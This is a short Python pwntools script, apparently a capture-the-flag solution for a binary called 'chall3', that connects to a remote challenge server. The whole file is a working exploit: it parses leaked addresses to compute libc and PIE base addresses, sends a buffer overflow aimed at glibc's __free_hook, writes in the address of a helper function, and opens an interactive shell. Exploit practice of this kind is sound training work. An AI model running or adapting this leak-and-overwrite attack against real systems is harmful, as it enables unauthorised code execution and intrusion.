#!/usr/bin/env python3


from pwn import *


e = ELF("./chall3")
#r = process("./chall3")
r = remote("3.97.113.25",9003)
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
r.recvuntil(b"STUFF ")
leak = int(r.recvuntil(b" "),16)
libc_base = leak - libc.sym["system"]
leak = int(r.recvline().rstrip(b"!!\n"),16)
pie_base = leak - e.sym["vuln"]
detonator = b'A' * 40 + p64(libc_base + libc.sym["__free_hook"])
r.send(detonator)
bomb = '0' * (1024 - len(str(e.sym["no_gadget_here_so_let_me_help_you"])))  + str(pie_base + e.sym["no_gadget_here_so_let_me_help_you"])
r.sendline(bomb)
r.recv()
r.interactive()
r.close()
